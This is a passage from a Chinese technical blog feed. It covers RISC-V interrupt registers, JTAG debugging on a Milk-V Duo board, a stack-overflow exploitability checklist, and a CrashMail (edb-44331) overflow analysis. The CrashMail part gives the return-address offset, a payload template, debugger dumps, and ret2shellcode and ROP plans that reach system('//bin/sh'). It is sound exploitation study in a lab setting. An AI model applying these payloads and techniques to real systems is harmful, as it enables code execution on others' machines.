      <li><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>是否为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>？</li>
      <li><strong><code class="language-plaintext highlighter-rouge">mie</code></strong>中对应位（如<strong><code class="language-plaintext highlighter-rouge">MTIE</code></strong>）是否使能？</li>
      <li>中断是否已挂起（如<strong><code class="language-plaintext highlighter-rouge">mip.MTIP=1</code></strong>）？</li>
    </ol>
  </li>
</ul>

<h3 id="2-安全性与优先级"><strong>(2) 安全性与优先级</strong></h3>

<ul>
  <li><strong>关键操作期间</strong>：通常先关闭<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>，再操作敏感寄存器，避免中断干扰。</li>
  <li><strong>嵌套中断</strong>：RISC-V默认不支持M模式中断嵌套（进入中断后<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>自动清零），需软件管理。</li>
</ul>

<h3 id="3-与s模式的关系"><strong>(3) 与S模式的关系</strong></h3>

<ul>
  <li>若中断委托给S模式（通过<strong><code class="language-plaintext highlighter-rouge">mideleg</code></strong>），则S模式的<strong><code class="language-plaintext highlighter-rouge">sstatus.SIE</code></strong>和<strong><code class="language-plaintext highlighter-rouge">sie</code></strong>寄存器将接管控制权，M模式的<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>和<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>不再影响已委托的中断。</li>
</ul>

<h3 id="6-对比其他架构"><strong>6. 对比其他架构</strong></h3>

<table>
  <thead>
    <tr>
      <th><strong>架构</strong></th>
      <th><strong>全局中断控制</strong></th>
      <th><strong>局部中断控制</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RISC-V</td>
      <td><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong></td>
      <td><strong><code class="language-plaintext highlighter-rouge">mie.&lt;x&gt;IE</code></strong></td>
    </tr>
    <tr>
      <td>ARM</td>
      <td><strong><code class="language-plaintext highlighter-rouge">DAIF.{I,F}</code></strong> (PSR寄存器)</td>
      <td><strong><code class="language-plaintext highlighter-rouge">GICD_ISENABLER</code></strong> (中断控制器)</td>
    </tr>
    <tr>
      <td>x86</td>
      <td><strong><code class="language-plaintext highlighter-rouge">EFLAGS.IF</code></strong></td>
      <td><strong><code class="language-plaintext highlighter-rouge">APIC/LVT</code></strong> 寄存器</td>
    </tr>
  </tbody>
</table>

<h3 id="7-总结"><strong>7. 总结</strong></h3>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code>是总开关</strong>，<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>是分路开关，二者<strong>“与”逻辑</strong>决定中断是否生效。</li>
  <li>实际开发中需协同配置这两个寄存器，并注意硬件自动清除<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>的行为。</li>
  <li>在操作系统或安全敏感场景中，需谨慎管理中断使能状态以避免竞态条件。</li>
</ul>]]></content><author><name></name></author><category term="riscv" /><summary type="html"><![CDATA[RISC-V中断处理过程]]></summary></entry><entry><title type="html">milkv duo 256M开发板JTAG调试方法</title><link href="http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html" rel="alternate" type="text/html" title="milkv duo 256M开发板JTAG调试方法" /><published>2025-05-07T13:27:38+08:00</published><updated>2025-05-07T13:27:38+08:00</updated><id>http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html"><![CDATA[<p>本文将深入探讨如何为 milkv duo 256M 开发板开启JTAG调试之门。我将从硬件连接、软件环境配置入手，详细讲解如何利用JTAG接口实现系统级调。</p>

<h2 id="调试架构">调试架构</h2>

<p>淘宝cklink-lite调试器，milkv duo256m开发板，杜邦线若干，usb串口调试线：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/milkv_duo256m_jtag%E8%B0%83%E8%AF%95%E5%8E%9F%E7%90%86.jpg" alt="milkv duo256m jtag调试原理.jpg" /></p>

<ol>
  <li>上位机运行玄铁官方的XuanTie-DebugServer用于和cklink-lite通信，同时开放调试端口给gdb；</li>
  <li>上位机运行gdb-multiarch连接到DebugServer，发送调试命令，接收调试数据；</li>
  <li>cklink-lite起到代理的作用，接收来自上位机的调试命令，把调试命令转化为JTAG协议发送到开发板，解析开发板回传的调试数据，发送回上位机DebugServer；</li>
  <li>上位机DebugServer把接收到的调试数据返回给gdb，完成一条调试命令。</li>
</ol>

<h2 id="开发板接线">开发板接线</h2>

<p>cklink-lite调试的的TCK、TMS、TDO、TDI、GND分别连接到开发板对应的引脚。注意GND线要接，否则上位机无法通过cklink-lite连接上开发板。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_10.45.14.png" alt="截屏2025-02-15 10.45.14.png" /></p>

<h2 id="上位机准备">上位机准备</h2>

<p>从玄铁官网下载DebugServer，执行安装命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x XuanTie_DebugServer-linux-x86_64-V5.18.3-20241119.sh
<span class="nv">$ </span><span class="nb">sudo</span> ./XuanTie_DebugServer-linux-x86_64-V5.18.3-20241119.sh <span class="nt">-i</span>
</code></pre></div></div>

<p><a href="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/XuanTie-DebugServer-linux-x86_64-V5.18.3-20241119.sh">XuanTie-DebugServer-linux-x86_64-V5.18.3-20241119.sh</a></p>

<p>需要注意的是，DebugServer安装过程中会把/usr/bin/XUANTIE_DebugServer目录添加到动态链接库搜索路径中，这会干扰其他引用的正常运行，解决方法是：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 删除动态链接库缓存文件
<span class="nv">$ </span><span class="nb">sudo rm</span> /etc/ld.so.conf.d/csky-debug.conf
<span class="nv">$ </span><span class="nb">sudo </span>ldconfig

</code></pre></div></div>

<p>DebugServerConsole是/usr/bin目录下的脚本文件，在第一行添加cd命令，使得每次运行之前先进入到安装目录，所有DebugServerConsole依赖的库文件都在安装目录下。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-17_12.54.16.png" alt="截屏2025-02-17 12.54.16.png" /></p>

<h2 id="使能jtag调试功能">使能jtag调试功能</h2>

<p>查看SG2002芯片手册可知，内存地址0x03001064、0x03001068、0x03001070、0x03001074对应的寄存器分别控制TMS、TCK、TDI、TDO功能的开启。</p>

<p>这四个地址保存的值默认为0，也就是系统一上电默认开启JTAG调试功能。</p>

<p>此时可以调试从FSBL—&gt;uboot—&gt;opensbi这个阶段的程序。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_13.55.40.png" alt="截屏2025-02-15 13.55.40.png" /></p>

<p>Linux内核启动之后，这四个地址分别都被写入了非零值，应该是内核初始化过程中对JTAG引脚的功能进行了重新设置：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.03.05.png" alt="截屏2025-02-15 14.03.05.png" /></p>

<p>我们把它重新写成0:</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.10.10.png" alt="截屏2025-02-15 14.10.10.png" /></p>

<p>再用gdb-multiarch去连：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.12.31.png" alt="截屏2025-02-15 14.12.31.png" /></p>

<h2 id="参考资料">参考资料</h2>

<p>JTAG入门之使用JTAG调试路由器：</p>

<p><a href="https://www.iotsec-zone.com/article/375">物联网安全从零开始-路由器jtag调试分析 - IOTsec-Zone</a></p>

<p><a href="https://club.rt-thread.org/ask/article/5c9e1b656dd77b9c.html">RT-Thread-MilkV Duo 使用 CK-Link DebugRT-Thread问答社区 - RT-Thread</a></p>

<p><a href="https://community.milkv.io/t/jtag-jtag-debug-guide-for-duo/1138">【jtag】Jtag debug guide for Duo</a></p>

<p>修改fip.bin文件添加JTAG调试功能：</p>

<p><a href="https://github.com/pigmoral/duo-buildroot-sdk/commit/c198e570fd25c94260e1024df991c9914c6d4680">Add jtag function for duo-64. · pigmoral/duo-buildroot-sdk@c198e57</a></p>]]></content><author><name></name></author><category term="riscv" /><summary type="html"><![CDATA[本文将深入探讨如何为 milkv duo 256M 开发板开启JTAG调试之门。我将从硬件连接、软件环境配置入手，详细讲解如何利用JTAG接口实现系统级调。]]></summary></entry><entry><title type="html">栈溢出利用条件分析</title><link href="http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="栈溢出利用条件分析" /><published>2025-04-18T18:27:38+08:00</published><updated>2025-04-18T18:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90.html"><![CDATA[<p>是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？</p>

<p>这些问题不回答清楚，往往后面的事情想了一半才发现前面的条件不满足，又回过头来思考前面这些问题，造成了时间的浪费，精力的损耗。</p>

<h1 id="栈溢出关注的点">栈溢出关注的点</h1>

<p>是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？</p>

<p>这些问题不回答清楚，往往后面的事情想了一半才发现前面的条件不满足，又回过头来思考前面这些问题，造成了时间的浪费，精力的损耗。</p>

<ul>
  <li>保护情况怎么样？按照关注度排序
    <ul>
      <li>Canary，有了它是不是直接就宣告死亡了？</li>
      <li>NX</li>
      <li>ASLR、PIE</li>
    </ul>
  </li>
  <li>是否可以交互？</li>
</ul>

<p>这个决定了后面的漏洞利用是payload一把梭哈，还是可以多次交互把漏洞利用过程分为多步来实现</p>

<ul>
  <li>覆盖的长度是多少？
    <ul>
      <li>部分覆盖返回地址，那么就只能做partial overwrite返回到有限的地址范围</li>
      <li>完全覆盖返回地址</li>
      <li>往返回地址后面继续覆盖
        <ul>
          <li>返回地址后面还可以写有限个字节，rop或者shellcode要控制长度</li>
          <li>无限长度写，任意长度rop或者shellcode</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>攻击者对覆盖的内容是否可控？
    <ul>
      <li>完全可控，不添加任何其他内容</li>
      <li>部分可控，程序会往中间或者两头加入东西，或者做内容过滤
        <ul>
          <li>末尾写0</li>
          <li>末尾写入其他字符串</li>
          <li>如果有内容过滤，那么payload要尝试避开这些东西</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>是否存在NULL字符截断？
    <ul>
      <li>不存在，攻击者可以往栈上面写NULL</li>
      <li>存在，一旦写入NULL就会截断</li>
    </ul>
  </li>
</ul>

<p>以上这些点既是具体问题的抽象总结，又离不开具体问题具体分析！</p>

<p>以上栈溢出漏洞条件的每一种排列组合情况，如果人类都能够找到利用的方式，那么机器也应该可以学会。</p>

<p>strcpy溢出，要解决x64模式下的0截断问题</p>

<h1 id="栈溢出的一些终止条件">栈溢出的一些终止条件</h1>

<ul>
  <li>遇到Canary</li>
  <li>（x64环境下） &amp;&amp; （ 存在NULL字符截断） &amp;&amp; （末尾会添加攻击者不可控的内容）
    <ul>
      <li><a href="https://www.notion.so/Crashmail-1-6-1d73f4b7819d8049b9fcfc9dff8a19ae?pvs=21">crashmail</a>栈溢出</li>
      <li><a href="https://www.notion.so/Exim-4-41-dns_build_reverse-1c23f4b7819d80f490c3e4fc91884fe7?pvs=21">exim</a>栈溢出</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？]]></summary></entry><entry><title type="html">Crashmail 栈溢出漏洞分析</title><link href="http://localhost:4000/userspace/2025/04/17/Crashmail-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="Crashmail 栈溢出漏洞分析" /><published>2025-04-17T13:27:38+08:00</published><updated>2025-04-17T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/17/Crashmail%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/17/Crashmail-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。
漏洞编号：edb-44331
利用环境：ubuntu 20.04，源代码32位编译</p>

<h1 id="漏洞信息">漏洞信息</h1>

<p>CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。</p>

<p>漏洞编号：edb-44331</p>

<p>利用环境：ubuntu 20.04，源代码32位编译</p>

<p>内存控制能力：</p>

<ul>
  <li>有NULL截断</li>
  <li>攻击者对输入内容不完全可控，payload末尾会添加“.busy”字符串</li>
</ul>

<h1 id="漏洞分析">漏洞分析</h1>

<p>以下是对x86程序的分析</p>

<p>漏洞函数位是LockConfig，由main函数直接调用：</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail.jpg" alt="crashmail.jpg" /></p>

<p>漏洞位置很明显，file字符串使用strcpy函数直接拷贝到buf[200]数组中，并且在末尾添加了“.busy”的字符串。</p>

<p>所以溢出的对象是LockConfig函数的buf数组，覆盖的返回值是LockConfig函数到main函数的返回地址，存在NULL字符截断，攻击者的输入内容不完全可控。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">LockConfig</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
	<span class="n">osFile</span> <span class="n">fp</span><span class="p">;</span>
	
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
	<span class="n">strcat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">".busy"</span><span class="p">);</span>

	<span class="p">......</span>
	
	<span class="n">osClose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

	<span class="k">return</span><span class="p">(</span><span class="n">TRUE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>若攻击者输入如下命令行参数，那么一长串字符‘c’就会被当做参数传递给LockConfig函数</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./crashmail <span class="s2">"SETTINGS"</span> ccccccccccccccccccccccccccccccccccccccccccccccccccc
</code></pre></div></div>

<p>main函数对参数的解析如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">cfg</span><span class="p">;</span>
   <span class="kt">uint32_t</span> <span class="n">cfgline</span><span class="p">;</span>
   <span class="kt">short</span> <span class="n">seconderr</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">errorbuf</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>

   <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">breakfunc</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">osInit</span><span class="p">())</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>

   <span class="n">done_osinit</span><span class="o">=</span><span class="n">TRUE</span><span class="p">;</span>

   <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span>
	  <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"?"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>      <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"-h"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>     <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"--help"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"help"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"/h"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>     <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"/?"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="p">))</span>
   <span class="p">{</span>
      <span class="n">printargs</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">parseargs</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">))</span><span class="c1">// 分析命令行参数，若有“SETTINGS”，那么随后的字符串</span>
															   <span class="c1">// 就是文件名，被保存到args[ARG_SETTINGS].data</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_VERSION</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
   <span class="p">{</span>
      <span class="n">Version</span><span class="p">();</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
   <span class="p">}</span>

	<span class="n">cfg</span><span class="o">=</span><span class="n">getenv</span><span class="p">(</span><span class="n">OS_CONFIG_VAR</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">cfg</span><span class="p">)</span>
		<span class="n">cfg</span><span class="o">=</span><span class="n">OS_CONFIG_NAME</span><span class="p">;</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_SETTINGS</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
      <span class="n">cfg</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_SETTINGS</span><span class="p">].</span><span class="n">data</span><span class="p">;</span>    <span class="c1">// cfg 可以由“SETTINGS”命令行参数指定</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_LOCK</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
   <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">LockConfig</span><span class="p">(</span><span class="n">cfg</span><span class="p">))</span>        <span class="c1">// 如果命令行参数中有“LOCK”，那么先走这里的LockConfig</span>
		<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to lock configuration file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">cfg</span><span class="p">);</span>
			<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="n">printf</span><span class="p">(</span><span class="s">"CrashMail is now locked, use UNLOCK to unlock</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
		<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
	<span class="p">}</span>

 <span class="p">......</span>

	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">done_lockconfig</span><span class="o">=</span><span class="n">LockConfig</span><span class="p">(</span><span class="n">cfg</span><span class="p">)))</span> <span class="c1">// 这里也有LockConfig，cfg参数攻击者指定</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to lock configuration file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">cfg</span><span class="p">);</span>
		<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>
	<span class="p">}</span>

</code></pre></div></div>

<p>从反汇编可以观察到buf数组到保存的rbp距离为0xd4，那么到返回地址的距离就是0xd8</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>text:0804A913 <span class="p">;</span> bool __cdecl LockConfig<span class="o">(</span>char <span class="k">*</span>file<span class="o">)</span>
.text:0804A913                 public LockConfig
.text:0804A913 LockConfig      proc near               <span class="p">;</span> CODE XREF: main+1CE↓p
.text:0804A913                                         <span class="p">;</span> main+264↓p
.text:0804A913
.text:0804A913 buf             <span class="o">=</span> byte ptr <span class="nt">-0D4h</span>
.text:0804A913 fp              <span class="o">=</span> dword ptr <span class="nt">-0Ch</span>
.text:0804A913 file            <span class="o">=</span> dword ptr  8
.text:0804A913
.text:0804A913 <span class="p">;</span> __unwind <span class="o">{</span>
.text:0804A913                 endbr32
.text:0804A917                 push    ebp
.text:0804A918                 mov     ebp, esp
.text:0804A91A                 push    edi
.text:0804A91B                 push    ebx
.text:0804A91C                 sub     esp, 0D0h
.text:0804A922                 call    __x86_get_pc_thunk_bx
.text:0804A927                 add     ebx, <span class="o">(</span>offset _GLOBAL_OFFSET_TABLE_ - <span class="nv">$)</span>
.text:0804A92D                 sub     esp, 8
.text:0804A930                 push    <span class="o">[</span>ebp+file]      <span class="p">;</span> src
.text:0804A933                 lea     eax, <span class="o">[</span>ebp+buf]
.text:0804A939                 push    eax             <span class="p">;</span> dest
</code></pre></div></div>

<p>攻击者构造如下启动命令就能造成返回地址覆盖为0xdeadbeef</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload <span class="o">=</span> b<span class="s1">'\x90'</span> <span class="k">*</span> 0xd8 + p32<span class="o">(</span>0xdeadbeef<span class="o">)</span>
</code></pre></div></div>

<h1 id="关键状态调试">关键状态调试</h1>

<h2 id="x86下的调试">x86下的调试</h2>

<p>断点位置选0x804AA19，也就是LockConfig函数ret之前</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0804AA13
.text:0804AA13 loc_804AA13:                            <span class="p">;</span> CODE XREF: LockConfig+95↑j
.text:0804AA13                                         <span class="p">;</span> LockConfig+EB↑j
.text:0804AA13                 lea     esp, <span class="o">[</span>ebp-8]
.text:0804AA16                 pop     ebx
.text:0804AA17                 pop     edi
.text:0804AA18                 pop     ebp
.text:0804AA19                 retn
.text:0804AA19 <span class="p">;</span> <span class="o">}</span> // starts at 804A913
.text:0804AA19 LockConfig      endp
.text:0804AA19
</code></pre></div></div>

<p>可以观察到buf数组地址为0xffad1a24，此时和栈地址相关的寄存器除了esp还有esi，esi寄存器的值为0xffad1d50，相对buf数组在高位，esi指向的位置距离返回地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x0804aa19 <span class="k">in </span>LockConfig <span class="o">(</span>                                              │sh: 1: .busy: not found
    <span class="nv">file</span><span class="o">=</span>0x80649cf &lt;Filter_Execute+525&gt; <span class="s2">"P</span><span class="se">\3</span><span class="s2">50"</span>, &lt;incomplete sequence <span class="se">\3</span>53&gt;<span class="o">)</span>          │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls
    </span>at crashmail/crashmail.c:505                                                      │bin                 crashmail-1.6         enter_container.sh  exp2.py
505     <span class="o">}</span>                                                                             │container_start.sh  crashmail-1.6.tar.gz  exp1.py
0xffad1d50:     0x69622f2f      0x68732f6e      0x75622e23      0xff007973            │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
0xffad1d60:     0xf7f95000      0x00000000      0xffad1dc8      0x00000000            │Failed to create lock file 
0xffad1d70:     0xf7fdb000      0x00000000      0xf7f95000      0xf7f95000            │sh: 1: .busy: not found
0xffad1d80:     0x00000000      0x9667f81c      0x74c07e0c      0x00000000            │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
<span class="o">(</span>gdb<span class="o">)</span> info reg                                                                        │Failed to create lock file 
eax            0x0                 0                                                  │sh: 1: .busy: not found
ecx            0x0                 0                                                  │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
edx            0x807437a           134693754                                          │Failed to create lock file 
ebx            0x90909090          <span class="nt">-1869574000</span>                                        │sh: 1: .busy: not found
esp            0xffad1afc          0xffad1afc                                         │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span> | .busy
ebp            0x90909090          0x90909090                                         │-bash: .busy: <span class="nb">command </span>not found
esi            0xffad1d50          <span class="nt">-5431984</span>                                           │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls       
</span>edi            0x90909090          <span class="nt">-1869574000</span>                                        │bin                 crashmail-1.6         enter_container.sh  exp2.py
eip            0x804aa19           0x804aa19 &lt;LockConfig+262&gt;                         │container_start.sh  crashmail-1.6.tar.gz  exp1.py
eflags         0x282               <span class="o">[</span> SF IF <span class="o">]</span>                                          │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span><span class="c">#.busy  </span>
cs             0x23                35                                                 │-bash: <span class="nb">ls</span><span class="c">#.busy: command not found</span>
ss             0x2b                43                                                 │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span> <span class="c">#.busy</span>
ds             0x2b                43                                                 │bin                 crashmail-1.6         enter_container.sh  exp2.py
es             0x2b                43                                                 │container_start.sh  crashmail-1.6.tar.gz  exp1.py
fs             0x0                 0                                                  │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
gs             0x63                99   
<span class="o">(</span>gdb<span class="o">)</span> p &amp;buf                                                                          │l<span class="s1">', '</span><span class="nt">-x</span><span class="s1">', '</span>/tmp/pwnlib-gdbscript-rsi1he64.gdb<span class="s1">']
$1 = (char (*)[200]) 0xffad1a24                                                       │[*] Paused (press any to continue)
(gdb)                                 
</span></code></pre></div></div>

<p>esi寄存器位于栈的高地址，这个有利的情况有助于我们解决2个矛盾：</p>

<ul>
  <li>ret2shellcode利用方式中，在当前程序里面找不到“jmp esp”指令</li>
</ul>

<p>我们可以把shellcode放到esi指向的位置后面，使用“xchg”指令把esi寄存器交换到eax寄存器中，再“jmp eax”跳转到shellcode执行。此种方式栈布局如下：</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-ret2shellcode.jpg" alt="crashmail-ret2shellcode.jpg" /></p>

<ul>
  <li>rop利用方式中，找不到已知地址用来放字符串”/bin/sh”：</li>
</ul>

<p>在可执行程序中可以找到命令执行函数osExecute：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int osExecute<span class="o">(</span>char <span class="k">*</span>cmd<span class="o">){</span>
   int res<span class="p">;</span>
   <span class="nv">res</span><span class="o">=</span>system<span class="o">(</span>cmd<span class="o">)</span><span class="p">;</span>
   <span class="k">return </span>WEXITSTATUS<span class="o">(</span>res<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>在地址 0x80649CF 处对cmd参数地址进行了压栈：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:080649CF                 push    eax             <span class="p">;</span> cmd
.text:080649D0                 call    osExecute
.text:080649D5                 add     esp, 10h
.text:080649D8                 mov     <span class="o">[</span>ebp+arcres], eax
</code></pre></div></div>

<p>因此我们可以在esi指向的栈中布置字符串“//bin/sh #”，其中“#”是为了注释掉“.busy”字符串，排除掉不可控字符串对命令执行的干扰，形成如下调用：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system</span><span class="p">(</span><span class="s">"//bin/sh #.busy"</span><span class="p">);</span>
</code></pre></div></div>

<p>我们可以用xchg指令把esi的值交换到eax中，再跳到 0x80649CF gadget处执行，那么/bin/sh字符串地址就可以被压栈。此种情况下栈布局为：</p>

